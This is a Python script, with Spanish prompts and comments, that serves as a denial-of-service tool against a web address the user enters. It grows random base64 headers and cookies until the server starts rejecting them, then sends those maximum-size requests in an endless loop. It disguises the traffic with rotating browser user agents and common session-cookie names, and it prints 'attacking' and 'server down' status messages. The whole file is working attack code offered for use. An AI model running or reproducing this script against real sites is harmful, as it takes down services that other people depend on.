import random
import base64
import requests
import time
import sys

def cookie_generator():

    global headers, cookies, cookie_pre
    AZAR=random.randint(1,10)

    cookie_pre=str(random.randint(9**100.65,9**101.65)).encode("utf-8")
    cookie_pre=base64.b64encode(cookie_pre*BYTESEND).decode("utf-8")

    #headers={"User-Agent":"{}".format(random_agents.get(AZAR))}
    headers={
        
        "User-Agent":f"{random_agents.get(AZAR)}",
        "Referer":f"https://www.{cookie_pre*BYTESEND}.com",
        "Cookie":f"{cookie_pre*BYTESEND}",
        "Authorization":f"{cookie_pre}",
        "Origin":f"{cookie_pre*BYTESEND}",
        "Cache-Control":"no-cache"

        }

    cookies={
        
        "{}".format(cookie_names.get(AZAR)):f"{cookie_pre}"

        }


random_agents={

    1:"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
    2: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/12.34567",
    3: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    4: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 YaBrowser/21.6.3.756 Yowser/2.5 Safari/537.36",
    5: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Whale/1.0.0.0 Safari/537.36",
    6: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 OPR/12.3456.7890 Safari/537.36",
    7: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Vivaldi/1.2.3.4 Safari/537.36",
    8: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Brave/9.8.7 Safari/537.36",
    9: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36",
    10: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.1234.567 (KHTML, like Gecko) Chrome/123.0.1234.567 Safari/537.36"

}

cookie_names={

    1:"PHPSESSID",
    2:"JSESSIONID",
    3:"ga",
    4:"_gid",
    5:"_gat",
    6:"__cfduid",
    7:"__utmz",
    8:"cookieconsent_status",
    9:"csrftoken",
    10:"session-id"

}

try:
    URL=input("Ingresa url atacar: ")

    while len(URL) == 0 or "/" not in URL:
        URL=input("Ingresa url valida [http://] or [https://]: ")
        #BYTESEND=int(input("Cantidad de Bytes a enviar [10 TO 40]: "))

except:
    pass
else:
    BYTESEND=1
    status_max=200


    while True:

        try:
            while status_max == 200:
                cookie_generator()
                test=requests.get(URL, headers=headers, cookies=cookies) # UTILIZA POST SI ES VUL
                status_max=test.status_code
                print("[FIND] BUSCANDO PESO DE PAYLOAD ->> [{}] STATUS [{}]".format(BYTESEND,status_max))
                
                if status_max != 200:
                    BYTESEND=BYTESEND-1
                    proceso=cookie_pre*BYTESEND

                    proceso=sys.getsizeof(proceso)

                    terminal=1048576/proceso

                    print(f"[SET] PAYLOAD SIZE {round(proceso/1024,2)}KB ->> [200]\n[SET] EN {round(terminal)} SOLICITUDES HAY ->> 1MB")
                    time.sleep(5)
                else:
                    BYTESEND=BYTESEND+1

        except:
            print("[ERROR] NOS HAN TIRADO X_X")
            exit(0)
        try:
            cookie_generator()
            atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
        except:
            print("[ERROR] NOS HAN TIRADO X_X")
            exit(0)
        else:

            if atak.status_code != 200:
                print("[SERVER OUT] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))
            else:
                print("[ATACANDO] URL ->> {} STATUS CODE ATACK ->> [{}]".format(URL, atak.status_code))